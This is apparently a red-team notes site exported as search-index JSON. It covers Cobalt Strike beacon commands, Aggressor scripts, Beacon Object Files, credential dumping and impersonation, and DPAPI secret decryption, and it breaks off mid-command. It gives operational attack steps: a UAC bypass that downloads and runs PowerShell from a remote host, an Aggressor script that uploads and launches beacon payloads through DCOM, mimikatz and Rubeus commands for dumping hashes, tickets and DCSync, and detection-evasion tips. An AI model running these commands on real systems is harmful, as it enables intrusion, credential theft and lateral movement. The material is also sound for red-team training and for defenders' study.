Recover credentials from Google Chrome clear Clear beacon queue connect Connect to a Beacon peer over TCP covertvpn Deploy Covert VPN client cp Copy a file dcsync Extract a password hash from a DC desktop View and interact with target's desktop dllinject Inject a Reflective DLL into a process dllload Load DLL into a process with LoadLibrary() download Download a file downloads Lists file downloads in progress drives List drives on target elevate Spawn a session in an elevated context execute Execute a program on target (no output) execute-assembly Execute a local .NET program in-memory on target exit Terminate the beacon session getprivs Enable system privileges on current token getsystem Attempt to get SYSTEM getuid Get User ID hashdump Dump password hashes help Help menu inject Spawn a session in a specific process inline-execute Run a Beacon Object File in this session jobkill Kill a long-running post-exploitation task jobs List long-running post-exploitation tasks jump Spawn a session on a remote host kerberos_ccache_use Apply kerberos ticket from cache to this session kerberos_ticket_purge Purge kerberos tickets from this session kerberos_ticket_use Apply kerberos ticket to this session keylogger Start a keystroke logger kill Kill a process link Connect to a Beacon peer over a named pipe logonpasswords Dump credentials and hashes with mimikatz ls List files make_token Create a token to pass credentials mimikatz Runs a mimikatz command mkdir Make a directory mode dns Use DNS A as data channel (DNS beacon only) mode dns-txt Use DNS TXT as data channel (DNS beacon only) mode dns6 Use DNS AAAA as data channel (DNS beacon only) mv Move a file net Network and host enumeration tool note Assign a note to this Beacon portscan Scan a network for open services powerpick Execute a command via Unmanaged PowerShell powershell Execute a command via powershell.exe powershell-import Import a powershell script ppid Set parent PID for spawned post-ex jobs printscreen Take a single screenshot via PrintScr method ps Show process list psinject Execute PowerShell command in specific process pth Pass-the-hash using Mimikatz pwd Print current directory reg Query the registry remote-exec Run a command on a remote host rev2self Revert to original token rm Remove a file or folder rportfwd Setup a reverse port forward rportfwd_local Setup a reverse port forward via Cobalt Strike client run Execute a program on target (returns output) runas Execute a program as another user runasadmin Execute a program in an elevated context runu Execute a program under another PID screenshot Take a single screenshot screenwatch Take periodic screenshots of desktop setenv Set an environment variable shell Execute a command via cmd.exe shinject Inject shellcode into a process shspawn Spawn process and inject shellcode into it sleep Set beacon sleep time socks Start SOCKS4a server to relay traffic socks stop Stop SOCKS4a server spawn Spawn a session spawnas Spawn a session as another user spawnto Set executable to spawn processes into spawnu Spawn a session under another process spunnel Spawn and tunnel an agent via rportfwd spunnel_local Spawn and tunnel an agent via Cobalt Strike client rportfwd ssh Use SSH to spawn an SSH session on a host ssh-key Use SSH to spawn an SSH session on a host steal_token Steal access token from a process timestomp Apply timestamps from one file to another unlink Disconnect from parent Beacon upload Upload a file Help We can also get help of a command with help &lt;command&gt;: beacon&gt; help sleep Use: sleep [time in seconds] &lt;jitter&gt; Change how often the beacon calls home. Use sleep 0 to force Beacon to call home many times each second. Specify a jitter value (0-99) to force Beacon to randomly modify its sleep time. Note: Parameters wrapped in [ ] are mandatory, whilst those in &lt; &gt; are optional although the default value maybe in not the best option. Sleep With sleep command we can modify the time when the beacon checks into the team server, by default is setted to 60 seconds. beacon&gt; sleep 5 [*] Tasked beacon to sleep for 5s [+] host called home, sent: 16 bytes OPSEC Note: Set a fast check-in can increase the chance of detection, it is also recommended to use a jitter which randomize the check-in time by a given percentage. File Management There are some commands to interact with files. # List the file on the specified directory beacon &gt; ls &lt;C:\\Path&gt; # Change into the specified working directory beacon &gt; cd [directory] # Delete a file\\folder beacon &gt; rm [file\\folder] # File copy beacon &gt; cp [src] [dest] # Download a file from the path on the Beacon host beacon &gt; download [C:\\filePath] # Lists downloads in progress beacon &gt; downloads # Cancel a download currently in progress beacon &gt; cancel [*file*] # Upload a file from the attacker to the current Beacon host beacon &gt; upload [ path to file] Execute Assembly The execute-assembly command allows the beacon to run .NET executables directly from memory. beacon&gt; execute-assembly [ path script.exe] [arguments] PowerShell Commands There are different ways to execute powershell commands on the beacon. # Import a Powershell .ps1 script from the control server and save it in memory in Beacon beacon &gt; powershell-import [ path to script.ps1] # Setup a local TCP server bound to localhost and download the script imported from above using powershell.exe. Then the specified function and any arguments are executed and output is returned. beacon &gt; powershell [commandlet][arguments] # Launch the given function using Unmanaged Powershell, which does not start powershell.exe. The program used is set by spawnto beacon &gt; powerpick [commandlet] [argument] # Inject Unmanaged Powershell into a specific process and execute the specified command. This is useful for long-running Powershell jobs beacon &gt; psinject [pid][arch] [commandlet] [arguments] Shellcode Injection It is possible to inject shellcode directly on a existent process. Its very useful when we need to spawn a listener of a different C2 or a meterpreter. beacon&gt; execute C:\\Windows\\System32\\notepad.exe beacon&gt; ps PID PPID Name Arch Session User --- ---- ---- ---- ------- ----- 1492 4268 notepad.exe x64 1 CORP\\user beacon&gt; shinject 1492 x64 C:\\Payloads\\msf.bin Hosting Files Cobalt Strike allows us to host files in his web server. Go to Attacks -&gt; Web Drive-by -&gt; Host File. Screenshots We can retrieve important information doing screenshots of the user’s desktop. We can retrieve shortcuts they have, what documents they’re looking and so on. Screenshots are stored in View -&gt; Screenshots. Beacon has multiple commands to take screenshots. printscreen: Take a single screenshot via PrintScr method. beacon&gt; printscreen screenhost: Take a single screenshot. beacon&gt; screenhost screenwatch: Take periodic screenshots. beacon&gt; screenwatch Keylogger A keylogger can capture the keystrokes of a user, which is specially useful for capturing usernames, passwords and other sensitive data. We can see the output of the keylogger in View -&gt; Keystrokes. beacon&gt; keylogger The keylogger runs as a job that can be stopped with the jobkill command. beacon&gt; jobs [*] Jobs JID PID Description --- --- ----------- 1 0 keystroke logger beacon&gt; jobkill 1 User Sessions We can check which users are currently logged on the compromised machine. beacon&gt; net logons Bypass UAC In cobalt strike there are two automatic ways to bypass UAC, with elevate and runasadmin. Elevate Command elevate command has two exploits, using Service Control Manager or via token duplication. beacon&gt; elevate Beacon Local Exploits ===================== Exploit Description ------- ----------- cve-2020-0796 SMBv3 Compression Buffer Overflow (SMBGhost) (CVE 2020-0796) ms14-058 TrackPopupMenu Win32k NULL Pointer Dereference (CVE-2014-4113) ms15-051 Windows ClientCopyImage Win32k Exploit (CVE 2015-1701) ms16-016 mrxdav.sys WebDav Local Privilege Escalation (CVE 2016-0051) svc-exe Get SYSTEM via an executable run as a service uac-schtasks Bypass UAC with schtasks.exe (via SilentCleanup) uac-token-duplication Bypass UAC with Token Duplication Not all UAC bypasses are created equal, and does not have same TokenPrivileges. svc-exe beacon&gt; elevate svc-exe tcp-4444 Started service 96d2381 on . [+] established link to child beacon: 10.10.10.10 Note: The beacon obtained with svc-exe bypass will have the necessary token privileges to run post-ex commands such as logonpasswords. uac-schtasks Similar to svc-exe. beacon&gt; elevate uac-schtasks tcp-4444 [*] Tasked Beacon to run windows beacon_bind_tcp (127.0.0.1:4444) in a high integrity context [+] established link to child beacon: 10.10.10.10 uac-token-duplication beacon&gt; elevate uac-token-duplication tcp-4444 Started service 96d2381 on . [+] established link to child beacon: 10.10.10.10 Note: The beacon obtained with uac-token-duplicatio bypass is limited and some post-ex command such as logonpasswords will fail due to the lack of some TokenPrivileges. Runasadmin Command With runasadmin command we can execute a high privilege command. Like elevate has some exploits. beacon&gt; runasadmin Beacon Command Elevators ======================== Exploit Description ------- ----------- uac-cmstplua Bypass UAC with CMSTPLUA COM interface uac-token-duplication Bypass UAC with Token Duplication Example: beacon&gt; runasadmin uac-cmstplua powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http: 10.10.10.10 b'))\" Headless Colbalt Strike When the team server starts the listeners we had running are started, but any hosted files we had, this could be a problem during persistence mechanisms. We can use a headless Cobalt strike client via the agscript utility, to execute an agressor script on start up. agscript [host] [port] [user] [password] Create a host_payloads.cna with the follwoing content: # Connected and ready on ready { # Generate payload $payload = artifact_payload(\"http\", \"powershell\", \"x64\"); # Host payload site_host(\"10.10.10.10\", 80, \" a\", $payload, \"text plain\", \"Auto Web Delivery (PowerShell)\", false); } You can test the script with: agscript 127.0.0.1 50050 headless password host_payloads.cna Finally add this to our existing startup service. ExecStartPost= bin sh -c ' usr bin sleep 30; home user cobaltstrike agscript 127.0.0.1 50050 headless password host_payloads.cna &amp;' Aggressor Scripts The .cna files that we load into the Cobalt Strike Script Manager are called Aggressor Scripts. These can override default behaviours in Cobalt Strike to customise the UI (add new menus, commands, etc), extended the data models, extended existing commands like jump, and add brand new, custom commands. Aggressor Scripts are programmed with Sleep language. Documentation: https: hstechdocs.helpsystems.com manuals cobaltstrike current userguide content topics agressor_script.htm Sleep: http: sleep.dashnine.org manual index.html Adding INVOKE_DCOM to JUMP and REMOTE-EXEC commands Aggressor can be used to register new techniques under jump and remote-exec using https: hstechdocs.helpsystems.com manuals cobaltstrike current userguide content topics_aggressor-scripts as-resources_functions.htm#beacon_remote_exploit_register and https: hstechdocs.helpsystems.com manuals cobaltstrike current userguide content topics_aggressor-scripts as-resources_functions.htm#beacon_remote_exec_method_register respectively. We are going to integrate Invoke-DCOM.ps1 into jump command. First we need to create a dcom.cna template file. sub invoke_dcom { } beacon_remote_exploit_register(\"dcom\", \"x64\", \"Use DCOM to run a Beacon payload\", &amp;invoke_dcom); This will register dcom as a new option inside the jump command and specifies invoke_dcom as the associated callback function. We also need to declare local variables sub invoke_dcom { local('$handle $script $oneliner $payload'); } beacon_remote_exploit_register(\"dcom\", \"x64\", \"Use DCOM to run a Beacon payload\", &amp;invoke_dcom); local defines variables that are local to the current function, so they will disappear once executeed. Note: Sleep language have global, closure-specific and local scopes for variable declaration. The next step is to acknowledge receipt of the task using btask. This takes the ID of the Beacon, the text to post and an ATT&amp;CK tactic ID. This will print a message to the Beacon console and add it to the data model used in the activity and session reports that you can generate from Cobalt Strike. sub invoke_dcom { local('$handle $script $oneliner $payload'); # acknowledge this command btask($1, \"Tasked Beacon to run \" . listener_describe($3) . \" on $2 via DCOM\", \"T1021\"); } In that case: $1 is the Beacon ID. $2 is the target to jump. $3 is the selected listener. Next we want to read in the Invoke-DCOM.ps1 script from our machine. This can be done with openf, getFileProper and script_resource. # read the script $handle = openf(getFileProper(\"C:\\\\Tools\", \"Invoke-DCOM.ps1\")); $script = readb($handle, -1); closef($handle); At this moment $script has the content of Invoke-DCOM.ps1. We can use https: download.cobaltstrike.com aggressor-script functions.html#beacon_host_script, this will host the script inside Beacon and returns a short snippet for running it. # host the script in Beacon $oneliner = beacon_host_script($1, $script); Note: We can use println($oneliner) to see the content of variables. We can check in the Script Console Cobalt Strike -&gt; Script Console. Next step is to generate and upload a paylaod to the target using https: download.cobaltstrike.com aggressor-script functions.html#artifact_payload and https: download.cobaltstrike.com aggressor-script functions.html#bupload_raw. These functions will generate an EXE payload and will upload it to the target directory. # generate stageless payload $payload = artifact_payload($3, \"exe\", \"x64\"); # upload to the target bupload_raw($1, \"\\\\\\\\ $+ $2 $+ \\\\C$\\\\Windows\\\\Temp\\\\beacon.exe\", $payload); Note: $+ is used for concat strings (Blank spaces are needed). Finally https: download.cobaltstrike.com aggressor-script functions.html#bpowerpick can execute the Invoke-DCOM oneliner. We need to pass it the target computer name and the path to the uploaded payload. Also beacuse, this could be a P2P payload and we want to automatically try and link to it, which can be done with https: download.cobaltstrike.com aggressor-script functions.html#beacon_link. # run via powerpick bpowerpick!($1, \"Invoke-DCOM -ComputerName $+ $2 $+ -Method MMC20.Application -Command C:\\\\Windows\\\\Temp\\\\beacon.exe\", $oneliner); # link if p2p beacon beacon_link($1, $2, $3); The complete script: sub invoke_dcom { local('$handle $script $oneliner $payload'); # acknowledge this command1 btask($1, \"Tasked Beacon to run \" . listener_describe($3) . \" on $2 via DCOM\", \"T1021\"); # read in the script $handle = openf(getFileProper(\"C:\\\\Tools\", \"Invoke-DCOM.ps1\")); $script = readb($handle, -1); closef($handle); # host the script in Beacon $oneliner = beacon_host_script($1, $script); # generate stageless payload $payload = artifact_payload($3, \"exe\", \"x64\"); # upload to the target bupload_raw($1, \"\\\\\\\\ $+ $2 $+ \\\\C$\\\\Windows\\\\Temp\\\\beacon.exe\", $payload); # run via powerpick bpowerpick!($1, \"Invoke-DCOM -ComputerName $+ $2 $+ -Method MMC20.Application -Command C:\\\\Windows\\\\Temp\\\\beacon.exe\", $oneliner); # link if p2p beacon beacon_link($1, $2, $3); } beacon_remote_exploit_register(\"dcom\", \"x64\", \"Use DCOM to run a Beacon payload\", &amp;invoke_dcom); Beacon Object Files Beacon Object Files (BOFs) are a post-ex capability that allows for code execution inside the Beacon host process. The main advantage is to avoid the fork &amp; run pattern that commands such as powershell, powerpick and execute-assembly rely on. Since these spawn a sacrificial process and use process injection to run the post-ex action, they are heavily scrutinised by AV and EDR products. BOFs are COFF objects writtent in C or C++ on which beacons acts as a linker and loader. Beacon does not link BOFs to a standard C library, so many common functions are not available. However, beacon does expose several internal APIs that can be used to simplify some actions such as argument parsing and hangling output. We can download the beacon.h library on the follwing link. https: hstechdocs.helpsystems.com manuals cobaltstrike current userguide content beacon.h Example on inline-execute An example of a basic BOF which sends Hello World!! :) as output is: #include &lt;windows.h&gt; #include \"beacon.h\" void go(char * args, int len) { BeaconPrintf(CALLBACK_OUTPUT, \"Hello World!! :)\"); } We need to compile it in windows or linux: Windows: cl.exe c GS- hello-world.c hello-world.o Linux: x86_64-w64-mingw32-gcc -c hello-world.c -o hello-world.o Finally we can execute it with the command inline-execute. beacon&gt; inline-execute C:\\Windows\\Temp\\hello-world.o Note: The built-in inline-execute commands expects that the entry point of the BOF is called go. Handling Arguments Sometimes we need to pass arguments to a BOF. A typicall console application may looks like main(int argc, char *argv[]) but BOF uses go(char * args, int len). These arguments are packed into a special binary format using the bof_pack aggressor function and can be unpacked using Beacons APIs exported via beacon.h. First we need to call BeaconDataParse to nitialise the parser and then BeaconDataExtract to extract the argument. void go(char * args, int len) { datap parser; BeaconDataParse(&amp;parser, args, len); char * var1; username = BeaconDataExtract(&amp;parser, NULL); BeaconPrintf(CALLBACK_OUTPUT, \"The VARIABLE 1 is: %s\", var1); } If we need to pass more than one argument, we need to unpack them in the same order they were packed. char * var1; char * var2; var1 = BeaconDataExtract(&amp;parser, NULL); var2 = BeaconDataExtract(&amp;parser, NULL); We may also want to extract integers, we can do it with BeaconDataInt. int number; number = BeaconDataInt(&amp;parser); Calling Win32 APIs APIs such as LoadLibrary and GetProcAddress are available from a BOF, which can be used to resolve and call other APIs at runtime. BOFs provice a convention called Dynamic Function Resolution (DFR) which allows beacons to perform the necessary resolution for you. Example of definition of a DFR (MessageBoxW): DECLSPEC_IMPORT INT WINAPI USER32$MessageBoxW(HWND, LPCWSTR, LPCWSTR, UINT); We can find the information on the documentation: https: learn.microsoft.com en-us windows win32 api winuser nf-winuser-messageboxw #include &lt;windows.h&gt; #include \"beacon.h\" void go(char * args, int len) { DECLSPEC_IMPORT INT WINAPI USER32$MessageBoxW(HWND, LPCWSTR, LPCWSTR, UINT); datap parser; BeaconDataParse(&amp;parser, args, len); wchar_t * message; message = (wchar_t *)BeaconDataExtract(&amp;parser, NULL); USER32$MessageBoxW(NULL, message, L\"Message Box\", 0); } Implementation with Aggressor We can implement our BOF with Aggressor by registering custom aliases and commands. alias hello-world { local('$handle $bof $args'); # read the bof file (assuming x64 only) $handle = openf(script_resource(\"hello-world.o\")); $bof = readb($handle, -1); closef($handle); # print task to console btask($1, \"Running Hello World BOF\"); # execute bof beacon_inline_execute($1, $bof, \"go\"); } # register a custom command beacon_command_register(\"hello-world\", \"Execute Hello World BOF\", \"Loads hello-world.o and calls the \\\"go\\\" entry point.\"); Arguments passed on the CS GUI command line are separated by whitespace. The first argument will be $1 is always the current beacon, then $2, $3… are our input. We can pack the arguments we want to send in our agressor script. These arguments are packed into a special binary format using the bof_pack aggressor function and can be unpacked using Beacons APIs exported via beacon.h. $args = bof_pack($1, \"z\", $2); \"z\" tells Cobalt Strike what format of data this is, where z represents a zero-terminated and encoded string. Cobalt Strike Data formats: Format Description Unpack Function b Binary Data BeaconDataExtract i 4-byte integer (int) BeaconDataInt s 2-byte integer (short) BeaconDataShort z zero-terminated + encoded string BeaconDataExtract Z zero-terminated wide string (wchar_t*)BeaconDataExtract Multiple arguments should be packed at the same time. pack 2 strings $args = bof_pack($1, \"zz\", \"str1\", \"str2\"); pack a string and an int $args = bof_pack($1, \"zi\", \"str1\", 123);"
					}

					
				
			
		
			
				
					,
					

					"red-team-credentials-and-user-impersonation": {
						"id": "red-team-credentials-and-user-impersonation",
						"title": "Credentials &amp; User Impersonation",
						"category": "",
						"url": " /red-team/credentials-and-user-impersonation/",
						"content": "Once we have access to user credentials or being able to impersonate the identity of a user we can move laterally. In this section it will be explained how to obtain credentials after fully compromise a host (admin privs needed!). Get users logged on the host With the command net we can get any users that are currently logged onto the host. beacon&gt; net logons Logged on users at \\\\localhost: CORP\\SRV-1$ CORP\\user With ps we can list which processes are running under which user. beacon&gt; ps PID PPID Name Arch Session User --- ---- ---- ---- ------- ----- 448 796 RuntimeBroker.exe x64 1 CORP\\user Logon Passwords As we seen on this gitbook, with mimikatz we can retrieve NTLM hashes from LSASS. The sekurlsa::logonpasswords comman in mimikatz can dump plaintext passwords from memory if wdigest is enabled, which is disabled by default. beacon&gt; mimikatz sekurlsa::logonpasswords Or we can use the short-command. beacon&gt; logonpasswords After dumping the credentials, they are stored in View -&gt; Credentials. eKeys Exists a mimikatz module that dumps kerberos encryption keys. Since most of the windows services choose to use kerberos over NTLM. beacon&gt; mimikatz sekurlsa::ekeys We are interested in aes256_hmac and aes128_hmac if is available. It will be used during Overpass-The-Hash technique. Certificates To enumerate certificates use Seatbelt. beacon&gt; execute-assembly C:\\Tools\\Seatbelt\\Seatbelt\\bin\\Release\\Seatbelt.exe Certificates Note: Ensure that the certificate is used for authentication. We can dump certificates with mimikatz. For users: beacon&gt; mimikatz crypto::certificates export For machines: beacon&gt; mimikatz !crypto::certificates systemstore:local_machine export NOTE: Mimikatz always export certificates with mimikatz as password. Download the file and sync files from cobalt strike to your local machine. beacon&gt; download C:\\Users\\user\\CURRENT_USER_My_0_User Example.pfx Note : Go to View -&gt; Downloads to sync files. Encode in base64 the .pfx file. cat CURRENT_USER_My_0_User\\ Example.pfx | base64 -w0 And finally use it to request a TGT. Security Account Manager The Security Account Manager (SAM) database holds the NTLM hashes of local accounts. It’s common that a local administrator use the same password across the entire environment. beacon&gt; mimikatz lsadump::sam Domain Cached Credentials Domain Cached Credentials were designed for instances where domain credentials are required to logon to a machine, even whilst it’s disconnected from the domain. beacon&gt; mimikatz lsadump::cache Make Token The make_token module which takes the username, domain and plaintext password for a user, as well as a logon type. This logon type allows the caller to clone its current token and specify new credentials for outbound connections. The new logon session has the same local identifier but uses different credentials for other network connections. make_token uses LOGON32_LOGON_NEW_CREDENTIALS logon type. beacon&gt; make_token CORP\\user Passw0rd! With rev2self will drop the impersonation. beacon&gt; rev2self [*] Tasked beacon to revert token [+] host called home, sent: 20 bytes Note We can also login as Local User: beacon&gt; make_token .\\lapsadmin password Extracting Kerberos Tickets Instead of craft a TGT we can retrieve it directly from memory. Rubeus triage will list the kerberos tickets in all the logon sessions. beacon&gt; execute-assembly C:\\Tools\\Rubeus\\Rubeus.exe triage Action: Triage Kerberos Tickets (All Users) [*] Current LUID : 0x3e7 ----------------------------------------------------------------------------- | LUID | UserName | Service | EndTime | ----------------------------------------------------------------------------- | 0x462eb | user1 @ CORP.LOCAL | krbtgt CORP.LOCAL | 5 12 2021 12:34:03 AM | | 0x25ff6 | user2 @ CORP.LOCAL | krbtgt CORP.LOCAL | 5 12 2021 12:33:41 AM | ----------------------------------------------------------------------------- Note: krbtgt service means that the ticket is a TGT. We can extrat it from memory with dump. beacon&gt; execute-assembly C:\\Tools\\Rubeus\\Rubeus.exe dump service:krbtgt luid:0x462eb nowrap Create a sacrificial logon with createnetonly and obtain a LUID and ProcessID. beacon&gt; execute-assembly C:\\Tools\\Rubeus\\Rubeus.exe createnetonly program:C:\\Windows\\System32\\cmd.exe [*] Action: Create Process ( netonly) [*] Showing process : False [+] Process : 'C:\\Windows\\System32\\cmd.exe' successfully created with LOGON_TYPE = 9 [+] ProcessID : 4872 [+] LUID : 0x92a8c Now with ptt we can pass the extracted TGT. execute-assembly C:\\Tools\\Rubeus\\Rubeus.exe ptt luid:0x92a8c ticket:[...base64-ticket...] [*] Action: Import Ticket [*] Target LUID: 0x92a8c [+] Ticket successfully imported! We can also use make_token and kerberos_ticket_use to import a TGT to the session. Steal the access token of that process and access to the target resource. beacon&gt; steal_token 5674 Process Injection We can inject a beacon payload into a target process in the form of shellcode. If we inject the beacon into a process owned by a different user, the beacon will run with the local and domain privileges of that user. beacon&gt; ps PID PPID Name Arch Session User --- ---- ---- ---- ------- ----- 448 796 explorer.exe x64 1 CORP\\user beacon&gt; inject 448 x64 smb-p2p-payload [+] established link to child beacon: 10.10.10.10 Note: If we try to inject into a process owned by other user we will need admin privs. OPSEC Note: Don’t perform cross-platform injection unless is needed. x64 -&gt; x86 or x86 -&gt; x64 Token Impersonation The steal_token command will impersonate the access token of the target process. beacon&gt; ps PID PPID Name Arch Session User --- ---- ---- ---- ------- ----- 448 796 explorer.exe x64 1 CORP\\user beacon&gt; steal_token 448 [+] Impersonated CORP\\user Note: steal_token is good for access remote resources across network but not for local actions. With rev2self will drop the impersonation. beacon&gt; rev2self [*] Tasked beacon to revert token [+] host called home, sent: 20 bytes Pass The Hash Is a technique which allows you to authenticate to a Windows service using the NTLM hash of a user’s password. Note: This modification process requires patching of LSASS memory which is high-risk action. beacon&gt; pth CORP\\user 4ffd3eabdce2e158d923ddec72de9790 In order to avoid detection, we can use mimikatz and specify a own process. beacon&gt; mimikatz sekurlsa::pth user:user domain:corp.local ntlm:4ffd3eabdce2e158d923ddec72de9790 run:\"powershell -w hidden\" OPSEC Alert: If no run parameter is specified, a cmd.exe window will be started. To avoid that use powershell -w hidden to create a hidden window. Finally use steal_token to impersonate the user ith the spawned process. beacon&gt; steal_token 4563 Once finished remember to to use rev2self and kill the spawned process. beacon&gt; rev2self [*] Tasked beacon to revert token [+] host called home, sent: 8 bytes beacon&gt; kill 4563 [*] Tasked beacon to kill 4563 [+] host called home, sent: 12 bytes OverPass The Hash OverPass The Hash also known as Pass The Key allows authentication with Kerberos rather than with NTLM. We can use NTLM hash or AES Keys to request a Kerberos TGT Ticket. To execute that technique we will use Rubeus. beacon&gt; execute-assembly C:\\Tools\\Rubeus.exe asktgt user:user domain:corp.local rc4:4ffd3eabdce2e158d923ddec72de9790 nowrap OPSEC Alert: Use AES keys rather than NTLM. Rubeus has an opsec argument which tells it to send the request without pre-auth, to emulate a legit kerberos traffic. beacon&gt; execute-assembly C:\\Tools\\Rubeus.exe asktgt user:user domain:CORP aes256:a561a175e395758550c9123c748a512b4b5eb1a211cbd12a1b139869f0c94ec10 nowrap opsec Note: Don’t use FQDN corp.local to specify the domain. Use the NetBIOS CORP. Once a ticket is created we can check it with klist. beacon&gt; run klist Finally we can use make_token with a dummy password to spawn a session. beacon&gt; make_token CORP\\user NOTREALPASSWORD To pass the TGT into this logon session, we can use Beacon’s kerberos_ticket_use command. This require that the ticket be on disk of our attacking workstation. [System.IO.File]::WriteAllBytes(\"C:\\Users\\Administrator\\Desktop\\UserTGT.kirbi\", [System.Convert]::FromBase64String(\"[...ticket...]\")) beacon&gt; kerberos_ticket_use C:\\Users\\Administrator\\Desktop\\jkingTGT.kirbi Elevated context If is on an elevated context, we can do it with Rubeus. beacon&gt; execute-assembly C:\\Tools\\Rubeus.exe asktgt user:user domain:corp.local aes256:a561a175e395758550c9123c748a512b4b5eb1a211cbd12a1b139869f0c94ec10 nowrap opsec createnetonly:C:\\Windows\\System32\\cmd.exe beacon&gt; steal_token 3453 Pass The Ticket We can use the make_token module with a fake password if we inject kerberos tickets on memory. beacon&gt; make_token CORP\\user FakePass We can use kerberos_ticket_use to select a TGT of the user to impersonate. If we obtain a ticket from Rubeus and we have it in Base64 we will need to decode it and store on a file PS C:\\&gt; [System.IO.File]::WriteAllBytes(\"C:\\Tickets\\user.kirbi\", [System.Convert]::FromBase64String(\"doIGWD[...snip...]MuaW8=\")) After that we can use the ticket. beacon&gt; kerberos_ticket_use C:\\Tickets\\user.kirbi Note: kerberos_ticket_use allows us to inject on memory TGT and TGS. Note: After importing the ticket make sure to always use the FQDN. If not some 1326 errors will appear. DCSync The Directory Replication Service (MS-DRSR) protocol is used to synchronise and replicate Active Directory data between domain controllers. DCSync is a technique which leverages this protocol to extract username and credential data from a DC. This tecnhique requires GetNCChanges which is usually only available for Domain Admins. beacon&gt; dcsync corp.local CORP\\krbtgt"
					}

					
				
			
		
			
				
					,
					

					"red-team-data-protection-api": {
						"id": "red-team-data-protection-api",
						"title": "Data Protection API (DPAPI)",
						"category": "",
						"url": " /red-team/data-protection-api/",
						"content": "The Data Protection API (DPAPI) is a component built into Windows that provides a means for encrypting data blobs. It uses cryptographic kyes and allows both native Windows functionality and third-party applications to protect unprotect data transparently to the user. DPAPI is used by the Windows Credential Manager to sotre saved secrets such as RDP credential, and by third-party applications like Google Chrome. Credential Manager The credential manager blobs are stored in user’s AppData directory. With vaultcmd tool we can list them. beacon&gt; run vaultcmd listcreds:\"Windows Credentials\" all Credentials in vault: Windows Credentials Credential schema: Windows Domain Password Credential Resource: Domain:target=TERMSRV srv-1 Identity: CORP\\user Hidden: No Roaming: No Property (schema element id,value): (100,2) Or with mimikatz. beacon&gt; mimikatz vault::list The masterkey with which the blobs have been encrypted are stored encryppted in the following path. beacon&gt; ls C:\\Users\\user\\AppData\\Local\\Microsoft\\Credentials Size Type Last Modified Name ---- ---- ------------- ---- 372b fil 02 25 2021 13:07:38 9D54C839752B38B233E5D56FDD7891A7 10kb fil 02 21 2021 11:49:40 DFBE70A7E5CC19A398EBF1B96859CE5D Note: Each user including system has their independent blob. Remember to list vaults with all the contexts. Decrypt the credentials To decrypt the credentials we need to find the master encryption key. Run mimikatz dpapi and provide the location to the blob on disk. beacon&gt; mimikatz dpapi::cred in:C:\\Users\\user\\AppData\\Local\\Microsoft\\Credentials\\9D54C839752B38B233E5D56FDD7891A7 **BLOB** dwVersion : 00000001 - 1 guidProvider : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb} dwMasterKeyVersion : 00000001 - 1 guidMasterKey : {a23a1631-e2ca-4805-9f2f-fe8966fd8698} dwFlags : 20000000 - 536870912 (system ; ) dwDescriptionLen : 00000030 - 48 szDescription : Local Credential Data algCrypt : 00006603 - 26115 (CALG_3DES) dwAlgCryptLen : 000000c0 - 192 dwSaltLen : 00000010 - 16 pbSalt : f8fb8d0f5df3f976e445134a2410ffcd dwHmacKeyLen : 00000000 - 0 pbHmackKey : algHash : 00008004 - 32772 (CALG_SHA1) dwAlgHashLen : 000000a0 - 160 dwHmac2KeyLen : 00000010 - 16 pbHmack2Key : e8ae77b9f12aef047664529148beffcc dwDataLen : 000000b0 - 176 pbData : b8f619[...snip...]b493fe dwSignLen : 00000014 - 20 pbSign : 2e12c7baddfa120e1982789f7265f9bb94208985 The pbData field contains the encrypted data and the guidMasterKey contains the GUID of the key needed to decrypt it. The masterkey information is stored in the following directory specifying the user SID. beacon&gt; ls C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-3263068140-2042698922-2891547269-1122 Size Type Last Modified Name ---- ---- ------------- ---- 740b fil 02 21 2021 11:49:40 a23a1631-e2ca-4805-9f2f-fe8966fd8698 928b fil 02 21 2021 11:49:40 BK-CORP 24b fil 02 21 2021 11:49:40 Preferred It is possible to dump the masterkey from memory with sekurlsa::dpapi on a high integrity session, but this interacts with LSASS which is not ideal for OPSEC. There are more silent ways such us using the RPC service exposed on the DC. beacon&gt; mimikatz dpapi::masterkey in:C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-3263068140-2042698922-2891547269-1120\\a23a1631-e2ca-4805-9f2f-fe8966fd8698 rpc [domainkey] with RPC [DC] 'corp.local' will be the domain [DC] 'dc.corp.local' will be the DC server key : 0c0105785f89063857239915037fbbf0ee049d984a09a7ae34f7cfc31ae4e6fd029e6036cde245329c635a6839884542ec97bf640242889f61d80b7851aba8df sha1: e3d7a52f1755a35078736eecb5ea6a23bb8619fc Once the key is obtained we can decyrpt the credential with dpapi::cred. beacon&gt; mimikatz dpapi::cred in:C:\\Users\\user\\AppData\\Local\\Microsoft\\Credentials\\9D54C839752B38B233E5D56FDD7891A7 masterkey:0c0105785f89063857239915037fbbf0ee049d984a09a7ae34f7cfc31ae4e6fd029e6036cde245329c635a6839884542ec97bf640242889f61d80b7851aba8df Decrypting Credential: [...snip...] UserName : CORP\\user CredentialBlob : Passw0rd! Scheduled Task Credentials Scheduled task can save credentials so they can run under the context of a user without them having to be logged on. If we have compromised a machine as a local admin, we can decrypt them in the same way as the credential manager. The blobs are saved under C:\\Windows\\Sytem32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials. beacon&gt; ls C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials Size Type Last Modified Name ---- ---- ------------- ---- 10kb fil 08 28 2022 02:42:24 DFBE70A7E5CC19A398EBF1B96859CE5D 527b fil 08 17 2022 04:55:28 F3190EBE0498B77B4A85ECBABCA19B6E With dpapi::cred can tell us the GUID of the master key used to encrypt each one. beacon&gt; mimikatz dpapi::cred in:C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials\\F3190EBE0498B77B4A85ECBABCA19B6E guidMasterKey : {aaa23e6b-bba8-441d-923c-ec242d6690c3} sekurlsa::dpapi to dump cached keys: beacon&gt; mimikatz !sekurlsa::dpapi [00000000] * GUID : {aaa23e6b-bba8-441d-923c-ec242d6690c3} * Time : 9 6 2022 12:14:38 PM * MasterKey : 10530dda04093232087d35345bfbb4b75db7382ed6db73806f86238f6c3527d830f67210199579f86b0c0f039cd9a55b16b4ac0a3f411edfacc593a541f8d0d9 * sha1(key) : cfbc842e78ee6713fa5dcb3c9c2d6c6d7c09f06c And finally decrypt it. beacon&gt; mimikatz dpapi::cred 